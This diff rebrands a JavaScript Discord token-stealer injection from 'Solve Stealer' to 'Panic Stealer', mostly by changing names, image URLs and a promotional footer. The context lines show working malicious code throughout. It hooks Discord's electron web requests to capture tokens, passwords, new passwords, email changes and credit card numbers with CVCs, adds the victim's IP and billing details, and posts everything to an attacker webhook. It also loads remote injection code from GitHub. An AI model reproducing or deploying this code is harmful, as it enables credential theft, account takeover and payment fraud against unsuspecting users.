@@ -17,9 +17,9 @@ var config = {
     "init-notify": "true",
     "embed-color": 2895667,
 
-    creator: "Solve",
+    creator: "Ayhu",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/imsolve/injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/imsolve/Panic-Injection/main/injection.js",
     webhook: "%WEBHOOK%",
     Placed: "%API_URL%",
     Filter: {
@@ -68,8 +68,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Solve Stealer",
-        avatar_url: "https://raw.githubusercontent.com/imsolve/Sovle-Stealer/main/imgs/solve.jpg",
+        username: "Panic Stealer",
+        avatar_url: "https://raw.githubusercontent.com/imsolve/Panic/main/img/panic.png",
         content: "",
         embeds: [{
             title: title,
@@ -77,11 +77,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Solve Stealer`
+                name: `Panic Stealer`
             },
             
             footer: {
-                text: `PANIC | https://GitHub.com/imsolve/`
+                text: `By Solve | .gg/haxxor | Github.com/imsolve`
             },
 
         }]
@@ -137,7 +137,7 @@ const GetNSFW = (bouki) => {
         case false:
             return ":underage: `NSFW Not Allowed`"
         default:
-            return "Idk bro you got me"
+            return "i've got no clue"
     }
 }
 const GetA2F = (bouki) => {
@@ -147,7 +147,7 @@ const GetA2F = (bouki) => {
         case false:
             return ":lock: `A2F Not Enabled`"
         default:
-            return "Idk bro you got me"
+            return "i've got no clue"
     }
 }
 
@@ -288,9 +288,9 @@ const post = async (params) => {
 const FirstTime = async () => {
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/Solve")){
+    if (fs.existsSync(__dirname + "/Panic")){
         try{
-        fs.rmdirSync(__dirname + "/Solve")
+        fs.rmdirSync(__dirname + "/Panic")
         }catch(err){
             console.log(err)
         }
@@ -302,7 +302,7 @@ const FirstTime = async () => {
     var client_discord = appName
     if (!token) {
         var params = await makeEmbed({
-            title: "Solve Stealer Initialized",
+            title: "Panic Stealer Initialized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
@@ -317,13 +317,13 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/imsolve/Sovle-Stealer/main/imgs/solve.jpg"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/imsolve/injection/main/solve.png"
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Panic-Stealer/main/img/xd.jpg"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: " Solve Stealer Initialized",
+            title: " Panic Stealer Initialized",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
             fields: [{
                 name: "Username <:username:1041634536733290596> ",
@@ -355,10 +355,10 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Solve Stealer :pill:](https://github.com/imsolve/Solve-Stealer)`,
+                value: `[Panic Stealer <a:mavikirmizi:853238372591599617>](Github.com/imsolve/panic)`,
                 inline: !0
             }, {
-                name: "Solve Files",
+                name: "Panic Files",
                 value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                 inline: !0
             }, {
@@ -370,7 +370,7 @@ const FirstTime = async () => {
                 value: `\`${user.email ?? "none"}\``,
                 inline: !0
             }, {
-                name: "Bio :pill:",
+                name: "Bio <a:mavikirmizi:853238372591599617>",
                 value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                 inline: !1
             }, {
@@ -395,7 +395,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "Solve User log out (User not Logged in before)",
+                title: "Panic User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
@@ -410,13 +410,13 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/imsolve/Sovle-Stealer/main/imgs/solve.jpg"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/imsolve/injection/main/banner.gif"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Panic-Stealer/main/img/xd.jpg"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
             
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Solve Stealer Victim got logged out",
+                title: "Panic Stealer Victim got logged out",
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
                     name: "Username <:username:1041634536733290596> ",
@@ -448,10 +448,10 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Solve Stealer  :pill:](https://github.com/imsolve/Solve-Stealer)`,
+                    value: `[Panic Stealer  <a:mavikirmizi:853238372591599617>](Github.com/imsolve/panic)`,
                     inline: !0
                 }, {
-                    name: "Solve Files",
+                    name: "Panic Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -467,7 +467,7 @@ const FirstTime = async () => {
                     value: `\`${user.phone ?? "None"}\``,
                     inline: !0
                 }, {
-                    name: "Bio :pill:",
+                    name: "Bio <a:mavikirmizi:853238372591599617>",
                     value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                     inline: !1
                 }, {
@@ -584,8 +584,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/imsolve/Sovle-Stealer/main/imgs/solve.jpg"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/imsolve/injection/main/banner.gif"
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Panic-Stealer/main/img/xd.jpg"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -601,7 +601,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "Solve Stealer User Login",
+                title: "Panic Stealer User Login",
                 color: config['embed-color'],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
@@ -634,10 +634,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Solve Stealer :pill:](https://github.com/imsolve/Solve-Stealer)`,
+                    value: `[Panic Stealer <a:mavikirmizi:853238372591599617>](Github.com/imsolve/panic)`,
                     inline: !0
                 }, {
-                    name: "Solve Files",
+                    name: "Panic Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -657,7 +657,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     value: `\`${password}\``,
                     inline: !0
                 }, {
-                    name: "Bio :pill:",
+                    name: "Bio <a:mavikirmizi:853238372591599617>",
                     value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                     inline: !1
                 }, {
@@ -686,7 +686,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Solve Stealer Detect Password Changed",
+                    title: "Panic Stealer Detect Password Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -719,10 +719,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Solve Stealer :pill:](https://github.com/imsolve/Solve-Stealer)`,
+                        value: `[Panic Stealer <a:mavikirmizi:853238372591599617>](Github.com/imsolve/panic)`,
                         inline: !0
                     }, {
-                        name: "Solve Files",
+                        name: "Panic Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -746,7 +746,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`${data.new_password}\``,
                         inline: !0
                     }, {
-                        name: "Bio :pill:",
+                        name: "Bio <a:mavikirmizi:853238372591599617>",
                         value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                         inline: !1
                     }, {
@@ -773,7 +773,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Solve Stealer Detect Email Changed",
+                    title: "Panic Stealer Detect Email Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -806,10 +806,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Solve Stealer :pill:](https://github.com/imsolve/Solve-Stealer)`,
+                        value: `[Panic Stealer <a:mavikirmizi:853238372591599617>](Github.com/imsolve/panic)`,
                         inline: !0
                     }, {
-                        name: "Solve Files",
+                        name: "Panic Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -829,7 +829,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`${data.password}\``,
                         inline: !0
                     }, {
-                        name: "Bio :pill:",
+                        name: "Bio <a:mavikirmizi:853238372591599617>",
                         value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                         inline: !1
                     }, {
@@ -859,10 +859,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
     
                 var params = await makeEmbed({
-                    title: "Solve Stealer User Credit Card Added",
+                    title: "Panic Stealer User Credit Card Added",
                     color: config['embed-color'],
                     fields: [
-                      { name: "Solve Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
+                      { name: "Panic Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
                       { name: "IP", value: ip },
                       { name: "Username <:username:1041634536733290596>", value: `${user.username}#${user.discriminator}` },
                       { name: "ID <:iduser:1041634535395307520>", value: user.id },
